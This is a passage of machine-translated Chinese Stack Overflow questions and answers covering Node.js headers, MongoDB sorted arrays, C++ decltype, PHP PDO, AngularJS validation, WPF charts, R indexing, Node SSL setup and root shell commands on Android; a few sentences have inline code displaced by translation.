另请参阅[SO](https://stackoverflow.com/questions/3987384/what-is-an-approperiate-content-type-header-for-javascript-files)上的这个问题。

**更新：**

我已尝试执行您提供的代码，但以下代码不起作用。

```
res.setHeader('content-type', 'text/javascript');
res.send(JS_Script); 
```

这对我有用。

```
res.setHeader('content-type', 'text/javascript');
res.end(JS_Script); 
```

正如 robertklep 所建议的，请参考[节点 http docs](http://nodejs.org/docs/v0.4.0/api/http.html#response.setHeader)，那里没有`response.send()`。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-05-05T09:54:16.383

您可以直接设置内容类型，如下所示：

```
res.writeHead(200, {'Content-Type': 'text/plain'}); 
```

参考通过 nodejs 文档[链接](https://nodejs.org/api/http.html#http_event_response)。

# mongodb - 如何在没有竞争条件的情况下使用 mongodb 实现有序数组？

> ID：15899368
> 
> 赞同：5
> 
> 时间：2013-04-09T10:21:11.837
> 
> 标签：mongodb, optimization

我是 mongodb 的新手，也许这是一个微不足道的问题。我有两个 mongodb 集合：`user`和`post`. 用户可以创建和关注多个帖子，帖子按最后修改日期排序。可能有大量用户关注特定帖子，因此我不想在每个帖子文档中保留关注者列表。另一方面，一个用户可能不会关注超过几千个帖子，所以我决定在每个用户文档中保留关注帖子的 objectid 列表。

为了能够快速列出给定用户的 50 个最近修改的帖子，我选择将该`last_updated_at`字段与帖子 objectid 一起保留。

该`post`文件相当基本：

```
{
    "_id" : ObjectId("5163deebe4d809d55d27e847"),
    "title" : "All about music"
    "comments": [...]
    ...
} 
```

该`user`文档如下所示：

```
{
  "_id": ObjectId("5163deebe4d809d55d27e846"),
  "posts": [{
    "post": ObjectId("5163deebe4d809d55d27e847"),
    "last_updated_at": ISODate("2013-04-09T11:27:07.184Z")
  }, {
    "post": ObjectId("5163deebe4d809d55d27e847"),
    "last_updated_at": ISODate("2013-04-09T11:27:07.187Z")
  }]
  ...
} 
```

当用户创建或关注帖子时，我可以简单地`$push`将帖子的`ObjectId`和到用户文档中列表`last_updated_at`的末尾。`posts`当帖子被修改时（例如，当评论被添加到帖子中时），我`last_updated_at`会在所有关注者的用户文档中更新该帖子的字段。这很重，但我不知道如何避免它。

当我想获取用户最近更新的 50 个帖子的列表时，不幸的是，我需要获取关注的帖子的整个列表，然后`last_updated_at`在内存中排序，然后只保留前 50 个帖子。

因此，我尝试更改实现以在修改帖子时重新排序列表：我`$push`将它放到列表的末尾，并且`$pull`它从任何位置开始。由于这是一个两步程序，因此存在竞争条件，我可能会在列表中获得两次相同的帖子。有没有更好的方法来维护 mongodb 中的排序数组？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-09T12:36:29.037

### 数据模型调整

由于您可能经常更新给定用户的最新帖子，因此您可能希望避免不必要地重写数据以维护排序数组的开销。

要考虑的更好方法是展平数据模型并使用单独的集合而不是有序数组：

*   使用更新的帖子流创建一个单独的集合：`(userID, postID, lastUpdated)`
*   更新帖子后，您可以[`update()`](http://docs.mongodb.org/manual/reference/method/db.collection.update/)使用`multi:true`and`upsert:true`选项和`$set`last_updated_at 对新值进行简单操作。
*   要检索给定用户 ID 的最后 50 个更新帖子，您可以`find()`使用排序和限制选项进行正常操作。
*   要自动清理“旧”文档，您甚至可以为此集合设置[TTL 到期](http://docs.mongodb.org/manual/tutorial/expire-data/)，以便在一定天数后从活动流中删除更新

### 在 MongoDB 2.4 中推送到固定大小和排序的数组

如果您确实想维护有序数组，MongoDB 2.4 添加了两个与此用例相关的有用功能：

*   能够推送到固定大小的数组
*   能够推送到按嵌入式文档字段排序的数组

因此，您可以实现推送到按上次更新日期降序排序的 50 个固定大小的数组的结果：

```
db.user.update(
    // Criteria
    { _id: ObjectId("5163deebe4d809d55d27e846") },

    // Update
    { $push: {
        posts: {
            // Push one or more updates onto the posts array
            $each: [
                {
                    "post": ObjectId("5163deebe4d809d55d27e847"),
                    "last_updated_at": ISODate()
                }
            ],

            // Slice to max of 50 items
            $slice:-50,

            // Sorted by last_updated_at desc
            $sort: {'last_updated_at': -1}
        }
    }}
) 
```

`$push`将按排序顺序更新列表，并将列表`$slice`修剪为前 50 个项目。由于帖子不是唯一的，您仍然需要`$pull`首先从列表中获取原始帖子，例如：

```
db.user.update(
    // Criteria
    { _id: ObjectId("5163deebe4d809d55d27e846") },

    // Update
    { 
        $pull: {
            posts: { post: ObjectId("5163deebe4d809d55d27e847") }
        }
    }
) 
```

这种方法的一个好处是数组操作是在服务器上完成的，但是与在应用程序中对数组进行排序一样，您可能仍然需要更新文档而不是需要。

# c++ - `decltype` 是给我一个对象的静态类型，还是它的运行时类型？

> ID：15899369
> 
> 赞同：10
> 
> 时间：2013-04-09T10:21:13.043
> 
> 标签：c++, c++11, language-lawyer, decltype

> `[C++11: 7.1.6.2/4]:`表示的类型`decltype(e)`定义如下：
> 
> *   if`e`是不带括号的*id 表达式*或不带括号的类成员访问 (5.2.5)，`decltype(e)`是由 命名的实体的类型`e`。如果没有这样的实体，或者如果`e`命名了一组重载函数，则程序是非良构的；
> *   否则，如果`e`是一个 xvalue，`decltype(e)`是`T&&`，其中`T`的类型是`e`;
> *   否则，如果`e`是左值，`decltype(e)`是`T&`，其中`T`的类型是`e`；
> *   否则，`decltype(e)`是 的类型`e`。
> 
> 说明符的操作数`decltype`是未计算的操作数（第 5 条）。

第二种、第三种和第四种情况清楚地涉及表达式的类型，其中不包括任何多态性考虑。

但是，我不完全确定这里的“*实体*”是什么意思，第*一种*情况似乎是命名表达式引用的*对象*`e`。对于“实体的类型”是指它的运行时类型还是它的静态类型对我来说是模棱两可的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-09T10:21:13.043

由于第一种情况的限制，实际上不可能遇到这个问题。

考虑：

```
struct A     {};
struct B : A {};

int main()
{
   A* x = new B();
   // What is `decltype(*x)`?
} 
```

的使用`*`使我们陷入第三种情况。

并作为参考？

```
struct A     {};
struct B : A {};

int main()
{
   A& x = *(new B());
   // What is `decltype(x)`?
} 
```

`x`是一个 type 的引用`A&`，它的类型就是*这个*“实体”。

使用第一种情况的唯一方法是直接命名一个对象，我们不能以隐藏运行时类型的方式这样做：

```
struct A     {};
struct B : A { void foo() {} };

int main()
{
   A x = B();     // well, you've sliced it now, innit?

   decltype(x) y;
   y.foo();       // error: ‘struct A’ has no member named ‘foo’
} 
```

**这就是为什么根据[这些答案](https://stackoverflow.com/questions/10424337/does-c11s-decltype-make-clone-unecessary)，总是使用对象的*静态类型*。**

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-09T11:26:13.943

您不必查看各个点： 的结果`decltype`是编译器已知的类型，几乎不包括任何动态类型。你引用的最后一行再明确不过了：说明符没有被评估，这也排除了任何动态类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T17:00:43.510

这基本上是“实体”在这里意味着什么的问题（可能的含义在第 3 条中定义）。考虑

```
struct A {
  int a;
};

int main() {
  A a = {};
  const A b = {};

  const A *aptr = (rand() % 42) ? &a : &b;
  decltype(aptr->a) x = 0;
  decltype((aptr->a)) y = 0;
} 
```

是`x`'s 类型`const int`还是`int`? 如果您将*entity*表示“成员”，那是`int`因为该成员`A::a`具有 type `int`。如果您采用实体类型“对象”，则类型为`const int`或`int`，具体取决于 的结果`rand()`。对象、它们的存在和属性（包括它们的一般类型）是一个运行时问题。

我说这不是真正的模棱两可。因为每个人都知道是什么意思，并且因为标准使用短语“由 e 命名”而不是“由 e 引用”或“由 e 表示”，表明它只是被查询的名称查找结果。

请注意， 的类型`y`总是，因为表达式的类型是*并且* 它是一个左值。`const int&``aptr->a``const int`

# printing - 无法从 Windows Server 2003 R2 上的远程桌面打印

> ID：15899376
> 
> 赞同：0
> 
> 时间：2013-04-09T10:21:50.507
> 
> 标签：printing, remote-desktop

我们有 ac# 文档设计器项目。我们可以为大多数客户使用此程序打印文档。

但是对于拥有 Windows Server 2003 R2 操作系统的客户，我们面临一个问题。我通过远程桌面连接连接到客户电脑，

一旦我尝试从程序打印它不会给出任何错误，但它也不会打印任何页面！但是当我从打印机发送测试页时，它会毫无问题地发送文档。我们为 Windows server 2008 r2 做了类似的问题，是关于组策略设置的，问题解决了，不知道是不是和那个问题类似。

# javascript - 黑莓上下文菜单关闭事件

> ID：15899377
> 
> 赞同：1
> 
> 时间：2013-04-09T10:21:55.633
> 
> 标签：javascript, contextmenu, blackberry-webworks, blackberry-10

我开发了一个基于 javascript blackberry-webworks 的应用程序。我已经为菜单（[blackberry.ui.contextmenu.defineCustomContext](http://developer.blackberry.com/html5/apis/blackberry.ui.contextmenu.html#.defineCustomContext)）定义了我自己的上下文并添加了几个项目。它可以在适当的节点上打开，但我无法确定它何时关闭。

关闭上下文菜单时是否可以获取事件？或者是否有任何属性/方法可以提供上下文菜单状态（如“打开”/“关闭”）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T13:58:42.853

看起来您可以处理的唯一事件是 window.onContextMenu 事件，该事件在客户端/用户请求菜单时触发。

来自文档（[https://developer.blackberry.com/html5/apis/blackberry.ui.contextmenu.html](https://developer.blackberry.com/html5/apis/blackberry.ui.contextmenu.html)） *“上下文信息可通过上下文菜单事件“window.oncontextmenu”从窗口对象获得。此事件在任何时候触发有来自客户端的上下文菜单请求。此事件提供了您自己存储上下文所需的所有上下文信息并保存触发上下文菜单的元素。这允许您在上下文菜单完成后执行多种不同的操作请求。”*

# php - PDO - 动态查询构建

> ID：15899378
> 
> 赞同：1
> 
> 时间：2013-04-09T10:22:01.633
> 
> 标签：php, mysql, input, pdo

是否有可能为 PDO 构建动态查询？

**说明：**
我有以下功能：
函数

```
saveContent($roundId,$answer,$question_de,$question_en,$files_1_1,$files_1_2,$files_2_1,$files_2_2,$files_3_1,$files_3_2) {

        $sql_pictures = "
            UPDATE ".DBPREFIX."pictures
            SET
                file_1_static=:files_1_1,
                file_1_animation=:files_1_2,
                file_2_static=:files_2_1,
                file_2_animation=:files_2_2,
                file_3_static=:files_3_1,
                file_3_animation=:files_3_2
            WHERE
                roundId=:roundId";
        try {
            $db = self::getConnection();
            $stmt_pictures = $db->prepare($sql_pictures);

            $stmt_pictures->bindParam("roundId", $roundId);
            $stmt_pictures->bindParam("files_1_1", $$question_de);
            $stmt_pictures->bindParam("files_1_2", $question_en);
            $stmt_pictures->bindParam("files_2_1", $roundId);
            $stmt_pictures->bindParam("files_2_2", $$question_de);
            $stmt_pictures->bindParam("files_3_1", $question_en);
            $stmt_pictures->bindParam("files_3_2", $question_en);

            $stmt_pictures->execute();
            $db = null;
            return true;
        } catch(PDOException $e) {
            echo $e->getMessage();
        }

    } 
```

重要的部分在“sql_pictures”中。我通过将必要的数据传递给函数来调用此函数，如下所示：

```
if (isset($_POST['save'])) {        
            $saveContent = $helper->saveContent(
                $_POST['roundId'],
                $_POST['answer'],
                $_POST['question_de'],
                $_POST['question_en'],
                $_FILES["files_1_1"],
                $_FILES["files_1_2"],
                $_FILES["files_2_1"],
                $_FILES["files_2_2"],
                $_FILES["files_3_1"],
                $_FILES["files_3_2"]
            );  
        } 
```

正如你们中的一些人可能注意到的那样，它用于多文件上传。
现在的主要问题是，当字符串为空（未设置）或值未更改（即 $files_1_1 未更改或为空）时，我不想更新字段。

我怎样才能做到这一点？

**其他问题：**
使用它可能更好吗

```
<input type="file" name="files[]" id="file" /> 
```

代替

```
<input type="file" name="files_1_2" id="file" /> 
```

每个输入字段？
那么我该如何重构这个函数呢？我坐在上面好几个小时，但没有任何线索。一个提示会很好！:)

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:37:11.340

对于插入/更新查询，动态查询构建是非常简单的任务。只需创建一个键名等于字段名和相应值的数组，然后在循环中处理它们。

> 当字符串为空（未设置）或值未更改时，我不想更新字段

最后一个无关紧要。如果值没有改变 - 它也不会在表中改变。
对于其他值，创建一个包含适合您的值的数组（即非空），然后使用辅助函数动态创建 SET 语句。例如，您可以使用[PDO 标签 wiki](https://stackoverflow.com/tags/pdo/info)中的一个

> 其他问题：

就我个人而言，我更喜欢`files_1, files_2, files_3...`这种方式，因为它让我可以使用简单的 foreach 遍历`$_FILES`数组

# jquery - jQuery提交表单的提交功能并且不验证livevalidation

> ID：15899385
> 
> 赞同：0
> 
> 时间：2013-04-09T10:22:07.983
> 
> 标签：jquery, ruby-on-rails

我使用 livevalidation.js 来验证表单字段。但是我无法通过实时验证来验证单选按钮，因为我在表单提交 jquery 事件上编写了以下代码。

问题是，当我选择这些单选按钮而不是表单的其他字段时，它会提交应用的表单和模型验证，但它应该应用实时验证。

我的代码或提交函数有什么问题？

```
$('#new_league_info').submit(function(){
            if($('#league_info_state').val() != '')
            {
                if($('.re_conditioner_radio').is(':checked')){
                    $('#reconditioner_msg').css("hidden");
                    var spans = $('.reconditioner_err');
                    spans.text('');
                }

                else{
                    $('#reconditioner_msg').replaceWith('<span class=" reconditioner_err LV_invalid">Please Select a Reconditioner</span>');
                    return false;

                }
            }

            if ($(".view_offer_checkbox").is(':checked')){
                $('#manufacturer_msg').css("hidden");
                var spans = $('.manufacturer_err');
                spans.text('');
            }
            else{
                $('#manufacturer_msg').replaceWith('<span class=" manufacturer_err LV_invalid">Please Select a Manufacturer</span>');
                return false;

            }
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:27:31.603

利用

```
e.preventDefault(); 
```

防止单击提交按钮时的默认行为并进行自己的验证：

```
$('#new_league_info').submit(function(e){
    e.preventDefault();
    ... 
```

# android - 使用 EWS 发送带有长附件的邮件时出现问题

> ID：15899388
> 
> 赞同：0
> 
> 时间：2013-04-09T10:22:15.883
> 
> 标签：android, sendmail, email-attachments, exchangewebservices

我正在使用**EWS**向 Exchange Server 发送邮件。我可以发送没有附件的邮件。当我添加任何附件时，它会失败并出现此错误：

```
04-09 13:05:56.157: E/EWSJava !!!(26633): >>>> SimpleServiceRequestBase.internalExecute()
异常 START_ELEMENT 类型的元素节点“m:CreateAttachmentResponse”是
预期，但节点“{http://schemas.xmlsoap.org/soap/envelope/}Fault”
找到类型 START_ELEMENT。

```

我可以看到邮件保存在草稿中（草稿中没有附件）。

我的代码是：

```
EmailMessage message = new EmailMessage(acct.ewsService);
            message.getToRecipients().add(sRecipients);
            message.setSubject(sSubject);
            message.setBody(MessageBody.getMessageBodyFromText(sBody));
            if (fAttachments != null) {
                for (File f : fAttachments) {
                    Log.i("MailSender", "SendSMTPMail() attaching: " + f.getPath());
                    message.getAttachments().addFileAttachment(f.getPath());
                }
            }

            Log.i("MailSender", "SendMail: pre-message.send()");
            message.send();
            Log.i("MailSender", "SendMail: post-message.send()"); 
```

编辑：

当我尝试发送小文件时，相同的代码正在工作。但它无法用于更大尺寸的附件，如图像。

# angularjs - AngularJS 指令监视有效性

> ID：15899389
> 
> 赞同：30
> 
> 时间：2013-04-09T10:22:17.047
> 
> 标签：angularjs

我尝试创建一个指令，当输入字段被标记为无效时应该执行一些操作。对于这个例子，假设我有一个指令来检查输入是否是素数，并且我想创建一个指令，当它无效时向元素添加一个类：

```
<input type="text" ng-model="primeNumber" validate-prime invalid-add-class="error"> 
```

validate-prime 使用 ng-model 上的解析器和格式化程序来更新模型的有效性。

现在我希望 invalid-add-class 指令在模型无效时添加类“错误”，并在模型有效时将其删除。换句话说，它应该监视模型控制器的 $valid（或 $invalid）属性。但是，我不知道如何使它工作。我试过：

```
link : function(scope, element, attrs, ctrl) {
    ctrl.$watch("$valid", function(newVal, oldVal) {
    //never fired
    });
} 
```

也许我可以在范围内观察一些变量，但我不知道要观察哪个变量。

那么当模型的有效性发生变化时如何通知我呢？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2013-04-09T13:14:21.107

如果您有 a `<form>`，请将 a 添加`name`到它（假设为 'myForm'）和 a`name`到您的输入（假设`myInput`）。您应该可以通过以下方式做到`$watch`这一点：

```
scope.$watch('myForm.myInput.$valid', function(validity) {}) 
```

如果您没有`form`，您可以随时观看功能。这边走：

```
scope.$watch(function() { return ctrl.$valid; }, function(validity){}); 
```

[您可以在此处](http://docs.angularjs.org/api/ng.directive:form)阅读有关表单方法的更多信息。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2014-05-26T14:02:49.810

如果你没有，`<form />`你可以很容易地得到一个：

在您的指令定义中：

```
require: '^form' 
```

然后在您的链接函数中，表单作为第四个参数传递：

```
 link: function (scope, element, attr, ctrl) { 
```

现在您不必对表单或输入字段进行硬编码来执行 $watch：

```
 scope.$watch(ctrl.$name + '.' + element.attr('name') + '.$valid', 
 function (validity) {}); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-01-28T02:19:53.407

一般来说，我们的目标应该是使指令独立于任何一种形式或输入而工作。我们如何允许它读取本地`$valid`属性而不强制将其绑定到单个特定表单和输入名称？

只需`require: 'ngModel'`用作指令配置的属性之一。这会将本地 ngModel 控制器作为链接函数的第四个参数注入，您可以`$watch`直接放置一个，`$valid`而无需将指令的实现耦合到任何特定的表单或输入。

```
require: 'ngModel',
link: function postLink(scope, element, attrs, controller) {
    scope.inputCtrl = controller;
    scope.$watch('inputCtrl.$valid', handlerFunc)
} 
```

处理程序应始终触发具有该结构的 $valid 更改。请参阅[此 Fiddle](http://jsfiddle.net/xmlilley/2mvLr/6/)，其中验证输入是否符合美国邮政编码或 Zip+4 的模式。每次有效性更改时，您都会收到警报。

编辑 3/21/14：这篇文章之前被我的一个错觉挂断了，专注于实现问题的错误原因。我的错。上面的例子消除了这种固定。此外，添加了小提琴，表明这种方法确实有效，并且总是有效，一旦您在手表表达式周围添加引号。

# php - 使用 openid.php 在 php 中出现错误以登录 google 帐户

> ID：15899399
> 
> 赞同：0
> 
> 时间：2013-04-09T10:22:54.930
> 
> 标签：php, authentication, openid, lightopenid

我`openid.php`在 php 中使用 Google 帐户进行授权。但它会显示`9`警告

```
Warning: get_headers() [function.get-headers]: SSL operation failed with code 1\. OpenSSL Error messages: error:140770FC:SSL routines:SSL23_GET_SERVER_HELLO:unknown protocol in C:\xampp\htdocs\CuePointExample3\openid.php on line 315

Warning: get_headers() [function.get-headers]: Failed to enable crypto in C:\xampp\htdocs\CuePointExample3\openid.php on line 315 
```

等等。

# doctrine-orm - 教义 2 - COALESCE 和 CONCAT

> ID：15899400
> 
> 赞同：2
> 
> 时间：2013-04-09T10:22:58.220
> 
> 标签：doctrine-orm

我有这个 DQL 查询：

```
$repository->createQuery("SELECT f.id, COALESCE(f.name, 
CONCAT(f.floor_number, ' NP')) as name FROM ".__NAMESPACE__.'\\Floor f 
WHERE f.building = ?1')
        ->setParameter(1, $this->building); 
```

但它不起作用 - 我明白了

```
[Syntax Error] line 0, col 36: Error: Expected Doctrine\ORM\Query\Lexer::T_CLOSE_PARENTHESIS, got '(' 
```

原因是在 COALESCE 中使用了 CONCAT.... 有什么方法可以使它工作（没有本机查询）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-30T20:13:18.920

通过对 Doctrine 2.4 中的 DQL 解析器的改进[解决](https://github.com/doctrine/doctrine2/commit/1e1f34f9cb733a708e57fb8e5d5797a011a663af)了这个问题。升级到 2.4，此查询将起作用。

# c# - 日历日期更改时 WPF 图表更改

> ID：15899404
> 
> 赞同：0
> 
> 时间：2013-04-09T10:23:19.057
> 
> 标签：c#, wpf, visual-studio, xaml

我制作了一个从数据库中提取数据的 WPF 图。我需要数据在日期更改时自动更改。

这是我的代码：

XAML 代码：

```
 <DVC:Chart Name="callLogs" 
       Background="SteelBlue"
       Margin="136,0,0,0"
               Title="Calls Per Hour"
               BorderBrush="Transparent">
        <DVC:Chart.LegendStyle>
            <Style TargetType="Control">
                <Setter Property="Width" Value="0"/>
                <Setter Property="Height" Value="0"/>
            </Style>
        </DVC:Chart.LegendStyle>
        <DVC:Chart.Axes>
            <DVC:LinearAxis Orientation="Y" Title="Ammount of calls" ShowGridLines="True"/>
        </DVC:Chart.Axes>
        <DVC:Chart.Series>
            <DVC:ColumnSeries Title="Calls per Hour" 
                IndependentValueBinding="{Binding Path=Key}"
                DependentValueBinding="{Binding Path=Value}">
            </DVC:ColumnSeries>
        </DVC:Chart.Series>
    </DVC:Chart>
    <DatePicker x:Name="Datepicker1" HorizontalAlignment="Left" 
                Margin="10,21,0,0" 
                VerticalAlignment="Top" 
                Width="126" 
                BorderBrush="Transparent"
                SelectedDateFormat="Short"/> 
```

C#代码：

```
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Data;
 using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Shapes;
 using System.Data;
 using System.Data.SqlClient;
 using System.Xml;

 using System.Windows.Controls.DataVisualization;
 using System.Windows.Controls.Primitives;
 using System.Windows.Controls.DataVisualization.Charting;

 namespace MainWindow
 {
/// <summary>
/// Interaction logic for MainWindow.xaml
/// </summary>
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        LoadColumnChartData();
    }

    private void LoadColumnChartData()
    {
        Datepicker1.SelectedDate = DateTime.Today;
        string pickDate = Datepicker1.SelectedDate.Value.ToString("yyyy-MM-dd");
        int[] callCounter = new int[100];
        int[] callHour = new int[100];
        int counter = 0;

        SqlConnection sqlConnection1 = new SqlConnection("Server=nl-reportserver;Database=RealConnect;User Id=sa;Password=<password>");
        SqlCommand cmd = new SqlCommand();
        SqlDataReader reader;

        cmd.Parameters.Add("@pickDate", pickDate);
        cmd.CommandText = "SELECT * FROM RC_callsperhour where convert(date,call_logdate,120) = convert(date,@pickDate,120) order by callhour";
        cmd.CommandType = CommandType.Text;
        cmd.Connection = sqlConnection1;

        sqlConnection1.Open();

        reader = cmd.ExecuteReader();
        if (reader.HasRows)
        {
            while (reader.Read())
            {
                callHour[counter] = reader.GetInt32(2);
                callCounter[counter] = reader.GetInt32(3);
                counter++;
            }
        }
        else
        {
            MessageBox.Show("No rows found.");
        }
        reader.Close();

        sqlConnection1.Close();

        ((ColumnSeries)callLogs.Series[0]).ItemsSource = Enumerable.Range(0, counter).Select(i => new KeyValuePair<int, int>(callHour[i], callCounter[i])).ToArray();

    }
}
} 
```

请注意，出于安全目的，我已从 sql 连接中删除了密码。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:52:35.530

您可以使用 WPF 绑定来获取数据。首先，您需要创建一个`ObservableCollection<YourDataModel>`然后更改日期，它将设置您的模型类属性：

```
public class YourDataModel
{
    public property int CallHour { get;set; }
    public property int CallCounter { get;set; }

    public YourDataModel(callHour int, callCounter int)
    {
       CallHour = callHour;
       CallCounter = callCounter;
    }
}

public partial class MainWindow : Window
{
    private ObservableCollection<YourDataModel> dataModel; 

    public MainWindow()
    {
        InitializeComponent();
        dataModel = new ObservableCollection<YourDataModel>();

        //set itemsource property or you can bind from XAML
        //which is name columnseries x:Name=CallsPerHour
        CallsPerHour.ItemsSource = dataModel;
    }

    //when date change running this function
    private void GettingDataFromSql()
    {
        ...
        while (reader.Read())
        {
            YourDataModel data = new YourDataModel( reader.GetInt32(2), 
            reader.GetInt32(3));
            dataModel.Add(data);
        }
    }
} 
```

XAML：

```
<DVC:Chart.Series>
    <DVC:ColumnSeries Title="Calls per Hour" 
        IndependentValueBinding="{Binding CallHour, Mode=OneWay}"
        DependentValueBinding="{Binding CallCounter, Mode=OneWay}">
    </DVC:ColumnSeries>
</DVC:Chart.Series> 
```

# arrays - 根据索引排序数组〜文本

> ID：15899406
> 
> 赞同：1
> 
> 时间：2013-04-09T10:23:21.210
> 
> 标签：arrays, r, indexing

请输入`R`这些数据：

```
S.names <- c("FXI", "XLB", "GLD", "IWM", "XLE", "XLF", "EWZ", "GDX", "XLK", 
"TLT", "IYR", "QQQ", "SLV", "EWJ", "XLV", "DIA", "XHB", "EEM", 
"USO", "VWO", "SPY", "EFA")
strike_vec <- structure(list(Strike = c(152, 43, 61, 11, 56, 37, 36, 159, 96, 
74, 71, 27, 163, 128, 35, 44, 30, 40, 81, 19, 31, 48)), .Names = "Strike", row.names = 
c("DIA", "EEM", "EFA", "EWJ", "EWZ", "FXI", "GDX", "GLD", "IWM", "IYR", 
"QQQ", "SLV", "SPY", "TLT", "USO", "VWO", "XHB", "XLB", "XLE", 
"XLF", "XLK", "XLV"), class = "data.frame") 
```

如您所见，`strike_vec`行名等于`S.names`元素。

我想`strike_vec`根据 的顺序对元素进行排序`S.names`，即将每个`strike_vec`元素与您找到相应`S.names`行名的位置相关联。

最终结果应该类似于

```
> strike_vec.new
    [,1]
FXI   37
XLB   40
GLD  159
IWM   96
   ...
   ...
   ... 
```

其中`rownames(strike_vec.new)`完全符合 的顺序`S.names`。

我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:25:31.697

只需使用：

```
strike_vec[S.names,,drop=FALSE] 
```

这使 ：

```
 Strike
FXI     37
XLB     40
GLD    159
IWM     96
XLE     81
XLF     19
EWZ     56
GDX     36
XLK     31
TLT    128
IYR     74
QQQ     71
SLV     27
EWJ     11
XLV     48
DIA    152
XHB     30
EEM     43
USO     35
VWO     44
SPY    163
EFA     61 
```

这是有效的，因为如果您使用字符向量对数据帧的行进行索引，则索引将基于行名称。

# node.js - NodeJS SSL 错误

> ID：15899409
> 
> 赞同：1
> 
> 时间：2013-04-09T10:23:27.710
> 
> 标签：node.js, express

我似乎无法让 SSL 在 Ubuntu 12.04 下使用 Express 3 的 V0.10.3 NodeJS 应用程序工作。我在 Chrome 中收到以下错误：

```
Error 107 (net::ERR_SSL_PROTOCOL_ERROR): SSL protocol error 
```

我的 app.js 文件中有以下内容：

```
var privateKey = fs.readFileSync('./ssl/private.key');
var certificate = fs.readFileSync('./ssl/cert.crt');
var godaddy = fs.readFileSync('./ssl/gd_bundle.crt');

var options = {
        key: privateKey,
        cert: certificate,
        ca: godaddy
};
https.createServer(options, app).listen(3000, function(){
    console.log("Express https server listening on port 3000");
}); 
```

使用自签名证书的类似设置在我的开发盒上运行良好。知道我在哪里出错了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T18:16:59.867

如果它可以在 Firefox 上运行，但不能在 Chrome 上运行，请检查 Chrome 中的设置。

1.  转到设置 > 高级设置 > 网络 > 更改代理设置。
2.  它将打开 IE 设置面板
3.  转到底部的高级选项卡 > 安全选项组
4.  尝试检查 SSL 2.0（或不同的 SSL/TLS 版本）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T19:29:36.187

我得到了它的工作...感谢您的帮助。我一定遇到了某种文件级别的问题，因为当我从备份中恢复 ssl 文件时它起作用了。

# java - 如何在android应用程序中运行重命名shell命令（根）

> ID：15899414
> 
> 赞同：2
> 
> 时间：2013-04-09T10:23:34.523
> 
> 标签：java, android, eclipse, shell, command

我是安卓新手。我正在尝试运行 shell 命令来重命名系统中的文件。我有它的root访问权限。

外壳命令：

```
$ su
# mount -o remount,rw /system
# mv system/file.old system/file.new 
```

我已经尝试过了，但不起作用：

```
public void but1(View view) throws IOException{
    Process process = Runtime.getRuntime().exec("su");
    process = Runtime.getRuntime().exec("mount -o remount,rw /system");
    process = Runtime.getRuntime().exec("mv /system/file.old system/file.new");
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:36:32.420

您可以使用同一进程运行多个命令，方法是将命令写入进程的`OuputStream`. 这样，命令将在命令运行的相同上下文中`su`运行。就像是：

```
Process process = Runtime.getRuntime().exec("su");
DataOutputStream out = new DataOutputStream(process.getOutputStream());
out.writeBytes("mount -o remount,rw /system\n");
out.writeBytes("mv /system/file.old system/file.new\n");
out.writeBytes("exit\n");  
out.flush();
process.waitFor(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:52:06.483

您需要每个命令与 处于同一进程中`su`，因为切换到 root 不适用于您的应用程序，它适用于`su`，它在您到达 之前完成`mount`。

相反，请尝试两个 exec：

```
...exec("su -c mount -o remount,rw /system");
...exec("su -c mv /system/file.old system/file.new"); 
```

另外，请注意，我见过一些系统`mount -o remount,rw /system`会失败但`mount -o remount,rw /dev/<proper path here> /system`会成功。“这里的正确路径”因制造商而异，但可以通过编程方式收集。

# ajax - 没有得到 Jquery 响应

> ID：15899418
> 
> 赞同：0
> 
> 时间：2013-04-09T10:23:55.680
> 
> 标签：ajax, ruby-on-rails-3, jquery

我有返回小功能。我可以在控制台中看到响应，但是当我发出警报（响应）时我没有得到响应。

```
$.ajax({
    url: "/students/results?start="+start+"&end="+end_date+"&id=<%= params[:id] %>",
       success: function (response) {
         alert(response);
       }
}); 
```

请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:51:19.697

检查 json 的最佳方法是在代码下方打开您的 chrome 控制台复制粘贴，然后输入

```
var myJSONObject = {"bindings": [
        {"ircEvent": "PRIVMSG", "method": "newURI", "regex": "^http://.*"},
        {"ircEvent": "PRIVMSG", "method": "deleteURI", "regex": "^delete.*"},
        {"ircEvent": "PRIVMSG", "method": "randomURI", "regex": "^random.*"}
    ]
}; 
```

这将返回`undefined`，现在粘贴下面的代码，然后输入

```
myJSONObject.bindings 
```

这将返回`[Object, Object, Object]`

同样，`myJSONObject.bindings[0].ircEvent`它会返回`PRIVMSG`。

因此，请检查您的回复，您可以编写如下内容

```
$.ajax({
    url: "/students/results?start="+start+"&end="+end_date+"&id=<%= params[:id] %>",
       success: function (response) {
         jQuery('#some_text_field_id').val(response.bindings[0].ircEvent)
       }
}); 
```

我希望这将有所帮助。

# mvvm - 如何在 MVVM 中创建“非绑定”绑定？

> ID：15899419
> 
> 赞同：0
> 
> 时间：2013-04-09T10:24:03.013
> 
> 标签：mvvm, binding

我的问题非常接近这个问题：

